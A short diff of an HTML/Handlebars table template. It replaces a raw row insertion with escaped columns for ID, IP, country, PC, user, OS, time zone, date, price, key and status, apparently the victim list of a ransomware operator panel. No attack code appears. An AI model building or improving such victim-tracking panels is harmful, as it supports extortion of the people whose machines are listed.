@@ -44,7 +44,20 @@
                         </thead>
                         <tbody>
                             {{#each data}}
-                                {{{this}}}
+                            <tr>
+                                <td><span class="ID">{{ID}}</span></td>
+                                <td>{{IP}}</td>
+                                <td>{{Country}}</td>
+                                <td><img src="/Flags/{{Flag}}.svg" width="40" height="30"></td>
+                                <td>{{PC}}</td>
+                                <td>{{User}}</td>
+                                <td>{{OS}}</td>
+                                <td>{{TimeZone}}</td>
+                                <td>{{DateTime}}</td>
+                                <td><span class="Price">{{Price}}</span></td>
+                                <td><span class="Key">{{Key}}</span></td>
+                                <td><span class="Status">{{Status}}</span></td>
+                            </tr>
                             {{/each}}
                         </tbody>
                     </table>
